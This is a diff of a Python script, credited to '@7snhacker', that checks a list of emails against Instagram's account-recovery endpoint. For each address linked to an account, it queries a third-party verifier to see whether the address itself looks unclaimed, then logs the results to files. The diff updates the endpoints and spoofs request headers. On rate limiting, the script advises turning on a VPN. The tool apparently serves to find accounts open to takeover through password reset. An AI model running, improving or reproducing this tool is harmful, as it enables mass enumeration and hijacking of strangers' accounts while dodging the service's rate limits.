@@ -10,42 +10,72 @@ print("""
     ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗╚██████╗██║  ██║███████╗╚██████╗██║  ██╗
     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝
 by @7snhacker""")
-print("instagram version")
-print("")
-print("click Ctrl Z to stop")
+print("instagram version ")
 sleep = float(input("sleep : "))
 while True:
     reads = lst.readline().split('\n')[0]
     time.sleep(sleep)
-    req = requests.session()
-    link = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
-    req.headers = {'user-agent': generate_user_agent()}
-    req.headers.update({'X-CSRFToken': "missing"})
+    headers = {'user-agent': generate_user_agent(),
+               'X-CSRFToken': "missing"
+
+               }
     data = {"email_or_username":reads}
-    r = req.post(link,data=data)
+    url = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
+    r = requests.post(url,headers=headers,data=data)
     if ("We sent an") in r.text:
-        rz = requests.get(f'https://emailsverified-django.herokuapp.com/api/yahoo/?username={reads.replace("@yahoo.com","")}').text
-        rg = requests.get(f'https://emailsverified-django.herokuapp.com/api/gmail/?username={reads.replace("@gmail.com","")}').text
-        if "taken" in rz:
+        rc = requests.get(f"https://api.skrapp.io/v3/open/verify?email={reads}").text
+        if "Email is invalid" in rc:
             print(f"{reads} : Linked : Taken[!]")
-        elif "available" in rz:
+            with open("LinkedTaken.txt", "a") as LinkedTaken:
+                LinkedTaken.write(reads + "\n")
+        elif "Email is valid" in rc:
             print(f"{reads} : Linked : Available[*]")
-            with open("Linked.txt", "a") as Linked:
+            print(r.text)
+            with open("LinkedAvailable.txt", "a") as Linked:
                 Linked.write(reads + "\n")
-        elif "available" in rg:
-            print(f"{reads} : Linked : Available[*]")
-            with open("Linked.txt", "a") as Linked:
-                Linked.write(reads + "\n")
-        elif "taken" in rg:
-            print(f"{reads} : Linked : Taken[!]")
         else:
             print(f"{reads} : Linked : Unknown[*]")
+            print(rc)
+            with open("LinkedUnknown.txt", "a") as LinkedUnknown:
+                LinkedUnknown.write(reads + "\n")
     elif ("Please wait a few minutes before you try again.") in r.text:
         print("Please wait a few minutes")
-        time.sleep(3)
         print("You Send Many Requests")
+        print("Turn On Vpn")
+        time.sleep(2)
+
     else:
         print(f"UnLinked : {reads}")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
